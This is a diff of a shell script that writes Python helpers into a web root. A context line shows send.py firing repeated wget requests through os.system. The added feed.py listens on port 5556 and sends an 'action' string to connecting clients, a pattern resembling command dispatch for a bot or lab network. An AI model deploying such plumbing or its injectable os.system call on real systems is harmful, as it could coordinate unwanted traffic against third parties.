@@ -65,3 +65,14 @@ echo "    os.system(\"wget http://%s/url.php?url=%s -O /dev/null >/dev/null 2>^1
 echo "    print(\"Request Left: {}\".format(reqs))" >> /var/www/html/send.py
 echo "    time.sleep(int(wait_time))" >> /var/www/html/send.py
 echo "    reqs -= 1" >> /var/www/html/send.py
+
+echo "import socket, sys" > /var/www/html/feed.py
+echo "host = sys.argv[1]" >> /var/www/html/feed.py
+echo "action = sys.argv[2]" >> /var/www/html/feed.py
+echo "port = 3335" >> /var/www/html/feed.py
+echo "sock = socket.socket()" >> /var/www/html/feed.py
+echo "sock.bind((\"0.0.0.0\", 5556))" >> /var/www/html/feed.py
+echo "sock.listen(1)" >> /var/www/html/feed.py
+echo "conn, addr = sock.accept()" >> /var/www/html/feed.py
+echo "conn.send(str(action))" >> /var/www/html/feed.py
+echo "conn.close()" >> /var/www/html/feed.py
